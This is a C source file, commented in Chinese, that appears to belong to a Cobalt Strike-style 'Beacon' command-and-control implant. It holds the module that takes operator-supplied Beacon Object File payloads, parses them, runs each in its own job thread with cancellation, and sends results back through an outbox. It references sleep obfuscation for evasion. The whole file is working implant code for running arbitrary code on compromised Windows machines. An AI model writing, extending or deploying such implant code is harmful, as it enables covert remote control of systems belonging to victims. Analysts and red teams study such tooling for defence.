#include "beacon_bof_internal.h"

/*
 * COFF/BOF 加载执行模块。
 * 每个 BOF Job 拥有独立 runtime，用于隔离 BSS 表、API 解析缓存、
 * 输出上下文、异常状态和取消事件；并发 BOF 不共享这些运行期字段。
 */

/* ===== BOF Payload 解析（Go Beacon 格式） ===== */

/*
 * 解析 BOF 命令 payload
 * 格式: [4B coffLen][coffBytes][4B argsLen][argsBytes]
 * 入口点名称未在 payload 中传递，按约定默认 "go" / "_go"
 */
static BOOL BofParsePayload(Parser* p, PCHAR entryName, SIZE_T entryNameSize,
                            PVOID* bofData, PDWORD bofSize,
                            PVOID* argsData, PDWORD argsSize)
{
    ByteBuf coffBytes;
    ByteBuf argBytes;

    if (!p || !bofData || !bofSize) return FALSE;

    /* 读取 COFF 文件数据 */
    coffBytes = ParserBytes(p);
    if (!coffBytes.data || coffBytes.len == 0) return FALSE;

    *bofData = coffBytes.data;
    *bofSize = (DWORD)coffBytes.len;

    /* 设置默认入口点名称 */
#ifdef _WIN64
    if (entryName[0] == '\0') {
        memcpy(entryName, "go", min(entryNameSize, 3));
    }
#else
    if (entryName[0] == '\0') {
        memcpy(entryName, "_go", min(entryNameSize, 4));
    }
#endif

    /* 读取参数（可选） */
    *argsData = NULL;
    *argsSize = 0;

    if (ParserLeft(p) > 0) {
        argBytes = ParserBytes(p);
        if (argBytes.data && argBytes.len > 0) {
            *argsData = argBytes.data;
            *argsSize = (DWORD)argBytes.len;
        }
    }

    return TRUE;
}

/* ===== 主执行函数 ===== */

/* 完整的 BOF 加载→重定位→执行流程 */
static PacketList CommandBofExecute(BeaconContext* ctx, UINT32 task_id, Parser* p,
                                    BofJobRuntime* runtime)
{
    PacketList out;
    ByteBuf result;
    CHAR entry_name[256] = { 0 };
    PVOID bof_buffer = NULL;
    PVOID args_buffer = NULL;
    DWORD bof_size = 0;
    DWORD args_size = 0;

    PlistInit(&out);
    BbInit(&result);
    (VOID)task_id;

    if (!ctx || !p) {
        BbPrintf(&result, "BOF: invalid parameters");
        PlistAdd(&out, result);
        return out;
    }

    if (!runtime) {
        BbPrintf(&result, "BOF: missing runtime");
        PlistAdd(&out, result);
        return out;
    }

    runtime->last_error[0] = '\0';

    /* 延迟初始化 LdrApi 表 */
    BofInitLdrApi(runtime, ctx);

    /* 解析 payload */
    if (!BofParsePayload(p, entry_name, sizeof(entry_name),
                         &bof_buffer, &bof_size, &args_buffer, &args_size)) {
        BbPrintf(&result, "BOF: failed to parse payload");
        PlistAdd(&out, result);
        return out;
    }

    if (!BofLoadAndRun(ctx, runtime, bof_buffer, bof_size,
                       args_buffer, args_size, entry_name)) {
        if (JobIsCancelRequested(runtime->job)) {
            goto cleanup;
        }
        if (runtime->last_error[0]) {
            BbPrintf(&result, "BOF: %s", runtime->last_error);
        } else {
            BbPrintf(&result, "BOF: execution failed");
        }
        PlistAdd(&out, result);
    }

cleanup:
    if (bof_buffer)  BOFSECUREFREE(bof_buffer, bof_size);
    if (args_buffer) BOFSECUREFREE(args_buffer, args_size);

    return out;
}

/* ===== BOF Job 线程参数 ===== */

typedef struct BofJobArgs {
    BeaconContext* ctx;
    BeaconJob* job;
    BofJobRuntime* runtime;
    ByteBuf payload;
} BofJobArgs;

/* BOF Job 工作线程：执行 BOF 并将结果发送到 Outbox */
static DWORD WINAPI BofJobThread(PVOID param)
{
    BofJobArgs* args = (BofJobArgs*)param;
    PacketList results;
    Parser parser;
    SIZE_T i;

    if (!args || !args->ctx || !args->job) return 0;

    PlistInit(&results);

    /* 检查是否在启动前已被取消 */
    if (JobIsCancelRequested(args->job)) {
        ByteBuf msg;
        BbInit(&msg);
        BbPrintf(&msg, "BOF job %lu canceled before start", (unsigned long)args->job->task_id);
        JobEnqueueResult(args->ctx, args->job->task_id, args->job->command_id, &msg);
        BbFree(&msg);
    } else {
        /* 执行 BOF */
        ParserInit(&parser, args->payload.data, args->payload.len);
        results = CommandBofExecute(args->ctx, args->job->task_id, &parser, args->runtime);

        /* 将结果包发送到 Outbox */
        for (i = 0; i < results.count; i++) {
            if (results.items_are_final) {
                ByteBuf moved = results.items[i];
                BbInit(&results.items[i]);
                OutboxEnqueue(&args->ctx->outbox, moved);
            } else {
                JobEnqueueResult(args->ctx, args->job->task_id,
                                 args->job->command_id, &results.items[i]);
            }
        }
    }

    /* 清理并完成 Job */
    PlistFree(&results);
    BbFree(&args->payload);
    RuntimeActivityEnd(args->ctx);
    JobComplete(args->job);
    BofRuntimeFree(args->runtime);
    HeapFree(GetProcessHeap(), 0, args);

    return 0;
}

/* ===== BOF 命令入口（从 dispatcher 调用） ===== */

/* 创建 BOF Job，启动工作线程，返回启动状态 */
PacketList CommandBofHandle(BeaconContext* ctx, UINT32 task_id, Parser* p)
{
    PacketList out;
    BofJobArgs* args = NULL;
    BofJobRuntime* runtime = NULL;
    BeaconJob* job = NULL;
    SIZE_T left;
    ByteBuf msg;

    PlistInit(&out);

    if (!ctx || !p) {
        PlistAdd(&out, BbFromText("BOF: invalid parameters"));
        return out;
    }

    /* 检查 sleep 混淆是否正在进行 */
    if (!RuntimeActivityBegin(ctx)) {
        PlistAdd(&out, BbFromText("BOF: blocked while sleep obfuscation is active"));
        return out;
    }

    /* 创建 Job */
    job = JobCreate(ctx, task_id, 70u, JOB_TYPE_BOF, "bof");
    if (!job) {
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to create job"));
        return out;
    }

    /* 分配运行时结构 */
    runtime = (BofJobRuntime*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*runtime));
    if (!runtime) {
        JobComplete(job);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to allocate runtime"));
        return out;
    }

    InitializeCriticalSection(&runtime->lock);
    runtime->ctx        = ctx;
    runtime->job        = job;
    runtime->stop_event = job->cancel_event;

    /* 分配线程参数 */
    args = (BofJobArgs*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*args));
    if (!args) {
        JobComplete(job);
        BofRuntimeFree(runtime);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to allocate job args"));
        return out;
    }

    args->ctx      = ctx;
    args->job      = job;
    args->runtime  = runtime;
    BbInit(&args->payload);

    /* 复制剩余 payload 到线程参数 */
    left = ParserLeft(p);
    if (left && !BbAppend(&args->payload, p->data + p->off, left)) {
        BbFree(&args->payload);
        HeapFree(GetProcessHeap(), 0, args);
        JobComplete(job);
        BofRuntimeFree(runtime);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to copy job payload"));
        return out;
    }

    /* 启动工作线程 */
    if (!JobStartThread(job, BofJobThread, args)) {
        BbFree(&args->payload);
        HeapFree(GetProcessHeap(), 0, args);
        JobComplete(job);
        BofRuntimeFree(runtime);
        RuntimeActivityEnd(ctx);
        PlistAdd(&out, BbFromText("BOF: failed to start job thread"));
        return out;
    }

    /* 返回启动成功消息 */
    BbInit(&msg);
    BbPrintf(&msg, "BOF job %lu started", (unsigned long)task_id);
    PlistAdd(&out, msg);

    return out;
}
